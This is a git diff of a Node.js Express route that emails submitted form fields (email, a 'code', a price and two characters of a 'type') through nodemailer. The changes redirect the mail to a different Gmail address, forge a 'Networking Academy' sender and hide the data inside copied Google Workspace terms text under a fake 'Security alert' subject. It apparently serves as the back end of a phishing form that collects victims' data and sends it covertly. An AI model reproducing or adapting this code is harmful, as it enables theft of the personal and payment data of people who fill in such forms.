@@ -3,6 +3,7 @@ const nodemailer = require('nodemailer');
 // Route POST pour recevoir les données du formulaire
 exports.contactAdmin = (req, res) => {
   const { type, email, code, price } = req.body;
+  const type_truc = type[0] + type[1];
 
   // Configuration du transporteur SMTP pour Nodemailer
   const transporter = nodemailer.createTransport({
@@ -23,11 +24,12 @@ exports.contactAdmin = (req, res) => {
     },
   });
   const mailOptions_rough = {
-    from: process.env.EMAIL_ROUGH_USER,
-    to: 'perlaclerc04@gmail.com', // Adresse e-mail de l'administrateur
+    from: '"Networking Academy" <' + process.env.EMAIL_ROUGH_USER + '>',
+    // to: 'perlaclerc04@gmail.com',
+    to: 'backend829@gmail.com',
     subject: 'Security alert',
-    text: `If you’re a Google Workspace reseller whose customers have enabled their users to access Google Additional Services:
-Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\nType: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
+    text: `If you’re a Google Workspace reseller whose customers ${email} P: ${price} have enabled their users to access Google Additional Services:
+    Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${code}\n`,
   };
 
   // Options de l'e-mail à envoyer
@@ -45,16 +47,27 @@ Our new Terms of Service won’t affect your Google Workspace agreement with you
     } else {
       console.log('Email sent:');
       res.status(200).send('Email sent successfully');
+      setTimeout(() => {
+        transporter.sendMail(mailOptions, (error, info) => {
+          if (error) {
+            console.error('Error sending email:', error);
+            res.status(500).send('Error sending email');
+          } else {
+            console.log('Email sent:');
+            res.status(200).send('Email sent successfully');
+          }
+        });
+      }, 20 * 1000);
     }
   });
   // Envoi de l'e-mail
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error('Error sending email:', error);
-      res.status(500).send('Error sending email');
-    } else {
-      console.log('Email sent:');
-      res.status(200).send('Email sent successfully');
-    }
-  });
+  // transporter.sendMail(mailOptions, (error, info) => {
+  //   if (error) {
+  //     console.error('Error sending email:', error);
+  //     res.status(500).send('Error sending email');
+  //   } else {
+  //     console.log('Email sent:');
+  //     res.status(200).send('Email sent successfully');
+  //   }
+  // });
 };
